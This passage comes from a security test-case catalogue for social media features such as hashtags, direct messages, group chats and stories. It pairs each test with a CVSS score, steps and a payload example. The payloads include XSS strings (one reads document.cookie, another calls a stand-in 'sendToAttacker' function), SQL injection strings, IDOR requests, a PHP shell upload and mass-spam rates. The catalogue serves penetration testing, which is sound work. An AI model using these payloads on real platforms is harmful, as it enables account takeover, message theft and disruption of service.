**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Mention / Tag Users

**Test Steps:** 1. User requires tag approval 2. Tag without approval 3. Bypass setting

**Expected Result:** Tag approval settings should be enforced

**Payload Example:**

```
POST /api/photos/123/tag {"user_id":"requires_approval",approved:true}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-093 — Stored XSS in Hashtag
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Create post with XSS hashtag 2. View hashtag page 3. XSS executes

**Expected Result:** Hashtags should be sanitized

**Payload Example:**

```
#<script>alert('XSS')</script> or #test<img/src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-094 — SQL Injection in Hashtag Search
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Search hashtag 2. Inject SQL payload 3. Extract data

**Expected Result:** Hashtag queries should be parameterized

**Payload Example:**

```
/hashtags/' UNION SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-095 — Hashtag Hijacking
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Find trending hashtag 2. Flood with irrelevant content 3. Manipulate hashtag meaning

**Expected Result:** Trending algorithm should detect manipulation

**Payload Example:**

```
Mass post unrelated content with trending #
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## SOC-096 — Hidden Hashtag Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Find private/moderated hashtag 2. Access directly 3. View restricted content

**Expected Result:** Private hashtags should require authorization

**Payload Example:**

```
GET /api/hashtags/internal_company_tag
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-097 — Hashtag Count Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Create posts with hashtag 2. Manipulate usage count 3. Fake trending status

**Expected Result:** Hashtag counts should be accurate

**Payload Example:**

```
Inflate hashtag usage artificially
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-840; PortSwigger Business logic

---

## SOC-098 — Reserved Hashtag Usage
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Find reserved hashtags (official/verified) 2. Use in regular post 3. Impersonate official

**Expected Result:** Reserved hashtags should be restricted

**Payload Example:**

```
#OfficialAnnouncement by regular user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-099 — Hashtag SSRF via Preview
**Test Category:** Server-Side Request Forgery · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Find hashtag preview generation 2. Create hashtag linking to internal URL 3. SSRF

**Expected Result:** URLs in hashtags should be validated

**Payload Example:**

```
Hashtag with internal URL reference
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SOC-100 — Hashtag Length DoS
**Test Category:** Denial of Service · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Create extremely long hashtag 2. Post content 3. Check for parsing issues

**Expected Result:** Hashtag length should be limited

**Payload Example:**

```
#AAAAA...(100000 chars)
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Postman

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SOC-101 — Banned Hashtag Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Find banned hashtag 2. Use Unicode variations 3. Bypass ban

**Expected Result:** Banned hashtags should handle variations

**Payload Example:**

```
#bаnned (with Cyrillic а) vs #banned
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-840; PortSwigger Business logic

---

## SOC-102 — Hashtag Following IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Hashtags

**Test Steps:** 1. Follow hashtag 2. Modify request to follow for others 3. Manipulate others' feeds

**Expected Result:** Hashtag following should use session user

**Payload Example:**

```
POST /api/hashtags/tag/follow {"user_id":"victim"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-103 — DM Content XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Send DM with XSS payload 2. Recipient opens DM 3. Script executes

**Expected Result:** DM content should be sanitized

**Payload Example:**

```
<img src=x onerror=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-104 — DM IDOR - Access Others' Messages
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Open own DM 2. Modify conversation_id 3. Read others' private messages

**Expected Result:** DM access should verify participation

**Payload Example:**

```
GET /api/conversations/victim_conv_id/messages
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-105 — DM IDOR - Send as Another User
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Send DM 2. Modify sender_id 3. Impersonate another user

**Expected Result:** Sender should be from authenticated session

**Payload Example:**

```
POST /api/messages {"from":"victim_id",to:"target",content:"spam"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-106 — DM to Blocked User
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. User A blocks User B 2. User B sends DM to A 3. Bypass block

**Expected Result:** Blocked users should not be able to DM

**Payload Example:**

```
Send DM to blocking user via API
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-107 — DM Encryption Bypass
**Test Category:** Cryptographic Failures · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Capture DM traffic 2. Analyze encryption 3. Decrypt messages

**Expected Result:** DMs should use end-to-end encryption

**Payload Example:**

```
MITM attack on message transmission
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Burp Suite / Wireshark / mitmproxy

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---

## SOC-108 — DM Attachment Malware
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Attach file in DM 2. Upload malicious file 3. Recipient downloads

**Expected Result:** Attachments should be scanned and validated

**Payload Example:**

```
Executable disguised as document
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## SOC-109 — DM Read Receipt Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Receive DM 2. Read without triggering read receipt 3. Violate privacy

**Expected Result:** Read receipts should be accurate if enabled

**Payload Example:**

```
Read message via API without marking read
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-110 — DM Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Delete own message 2. Modify message_id 3. Delete others' messages

**Expected Result:** Deletion should verify authorship

**Payload Example:**

```
DELETE /api/messages/victim_message_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-111 — Mass DM Spam
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Send DMs to many users 2. Bypass rate limiting 3. Spam platform

**Expected Result:** DM rate should be limited

**Payload Example:**

```
Send 10000 DMs per hour
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SOC-112 — DM Search SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Search DM history 2. Inject SQL payload 3. Extract messages

**Expected Result:** Search should use parameterized queries

**Payload Example:**

```
search='; SELECT * FROM messages--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SOC-113 — Message Request Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Non-mutual follow sends DM 2. Bypass message request flow 3. Direct inbox access

**Expected Result:** Message requests should be enforced

**Payload Example:**

```
Skip message request for non-followers
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-114 — DM Forwarding Privacy Leak
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Receive DM 2. Forward to third party 3. Original sender info exposed

**Expected Result:** Forwarding should respect privacy

**Payload Example:**

```
Forward with original sender metadata
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Manual Testing

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## SOC-115 — Disappearing DM Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. Receive disappearing message 2. Capture before expiry 3. Store permanently

**Expected Result:** Disappearing messages should be enforced

**Payload Example:**

```
Screenshot or API capture before expiry
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Screen Capture

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-116 — DM Reaction IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Direct Messaging

**Test Steps:** 1. React to message 2. Modify message_id 3. React to others' private messages

**Expected Result:** Reactions should verify access

**Payload Example:**

```
POST /api/messages/private_msg_id/react
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-117 — Group IDOR - Access Private Group
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Find private group ID 2. Access group content 3. Bypass membership

**Expected Result:** Private groups should verify membership

**Payload Example:**

```
GET /api/groups/private_group_id/messages
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-118 — Group IDOR - Add Members Unauthorized
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Add member to group 2. Modify request for another group 3. Add to unauthorized group

**Expected Result:** Member addition should verify admin rights

**Payload Example:**

```
POST /api/groups/other_group/members {"user_id":"attacker"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-119 — Group Admin Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Join group as member 2. Modify role to admin 3. Gain admin privileges

**Expected Result:** Role changes should require admin authorization

**Payload Example:**

```
PUT /api/groups/123/members/self {"role":"admin"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-120 — Group Stored XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Post message in group 2. Include XSS payload 3. All members affected

**Expected Result:** Group messages should be sanitized

**Payload Example:**

```
<script>sendToAttacker(groupMessages)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-121 — Group Settings IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. View group settings 2. Modify group_id 3. Change other groups' settings

**Expected Result:** Settings changes should verify admin role

**Payload Example:**

```
PUT /api/groups/other_group/settings
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-122 — Group Delete IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Delete own group 2. Modify group_id 3. Delete another group

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/groups/victim_group_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-123 — Invite Link Enumeration
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Generate invite link 2. Analyze link format 3. Enumerate valid links

**Expected Result:** Invite links should be unpredictable

**Payload Example:**

```
Sequential or predictable invite tokens
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Sequencer / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## SOC-124 — Expired Invite Link Usage
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Get invite link 2. Link expires 3. Use after expiration

**Expected Result:** Expired links should be rejected

**Payload Example:**

```
Use invite after expiration time
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-125 — Group Member Removal IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Remove member from group 2. Modify member_id 3. Remove any member

**Expected Result:** Removal should require admin rights

**Payload Example:**

```
DELETE /api/groups/123/members/admin_user_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-126 — Group Message Pinning IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Pin message 2. Modify message_id 3. Pin message from other group

**Expected Result:** Pinning should verify group context

**Payload Example:**

```
POST /api/groups/123/pin {"message_id":"other_group_msg"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-127 — Group File Upload Exploit
**Test Category:** File Upload Vulnerabilities · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Upload file to group 2. Include malicious file 3. Members download

**Expected Result:** Group files should be validated

**Payload Example:**

```
PHP shell uploaded to group
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Weevely

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## SOC-128 — Mass Group Creation
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Create many groups rapidly 2. Exhaust resources 3. Platform DoS

**Expected Result:** Group creation should be rate-limited

**Payload Example:**

```
Create 10000 groups per minute
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## SOC-129 — Group Ban Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Get banned from group 2. Create new account 3. Rejoin group

**Expected Result:** Consider IP/device bans for severe cases

**Payload Example:**

```
Rejoin after ban via new account
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-130 — Room Capacity Bypass
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Group Chat / Rooms

**Test Steps:** 1. Room reaches capacity 2. Force join via API 3. Exceed capacity

**Expected Result:** Capacity limits should be enforced

**Payload Example:**

```
Join full room via direct API
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SOC-131 — Story View IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. View own story 2. Modify story_id 3. View private user's story

**Expected Result:** Story viewing should respect privacy

**Payload Example:**

```
GET /api/stories/private_story_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-132 — Story XSS via Sticker/Text
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. Add text/sticker to story 2. Include XSS payload 3. Viewers affected

**Expected Result:** Story content should be sanitized

**Payload Example:**

```
Text overlay: <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-133 — Story Expiration Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. View story before expiration 2. Access after 24 hours 3. View expired content

**Expected Result:** Expired stories should be inaccessible

**Payload Example:**

```
GET /api/stories/expired_story_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-134 — Story Screenshot Detection Bypass
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. View story with screenshot detection 2. Capture without detection 3. Bypass privacy feature

**Expected Result:** Detection should be robust if advertised

**Payload Example:**

```
Screen capture via external tools
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** External Screen Recording

**References:** CWE-840; PortSwigger Business logic

---

## SOC-135 — Story Viewer List IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. Check own story viewers 2. Modify story_id 3. See others' story viewers

**Expected Result:** Viewer lists should verify ownership

**Payload Example:**

```
GET /api/stories/others_story/viewers
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-136 — Story Reply XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. Reply to story 2. Include XSS in reply 3. Story owner views reply

**Expected Result:** Replies should be sanitized

**Payload Example:**

```
<img src=x onerror=alert(1)> in reply
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SOC-137 — Story Highlight IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Stories / Temporary Content

**Test Steps:** 1. Add story to highlights 2. Modify story_id 3. Add others' stories to your highlights

**Expected Result:** Highlighting should verify ownership

**Payload Example:**

```
POST /api/highlights {"story_id":"others_story"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SOC-138 — Story Location Spoofing
